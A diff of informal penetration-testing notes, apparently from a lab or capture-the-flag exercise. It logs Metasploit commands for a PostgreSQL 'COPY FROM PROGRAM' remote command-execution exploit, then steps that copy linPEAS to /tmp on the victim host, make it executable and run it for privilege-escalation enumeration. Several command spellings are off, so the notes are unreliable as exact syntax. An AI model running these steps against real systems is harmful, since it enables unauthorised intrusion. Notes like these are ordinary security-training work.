@@ -30,7 +30,6 @@ this will be for the report that enumeration was a dead end
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhosts port 61775
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options [this is to validate config]
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > run [1:55] [DAY 11]
-
 [[[[[[HARD STOP found out that you need creds for this route]]]]]]
 
 
@@ -70,4 +69,7 @@ were going to download linPEAS to ourselves (ATTACKER) and then access it throug
 (VICTIM) mv linpeas.sh /tmp
 (VICTIM)cd /tmp
 (VICTIM)ls
-
+(VICTIM) chmod u+x linpeas.sh
+(VICTIM) ls -al
+(VICTIM) ctl a + H (capture everything you run in TERM)
+(VICTIM) ./linpeas.sh
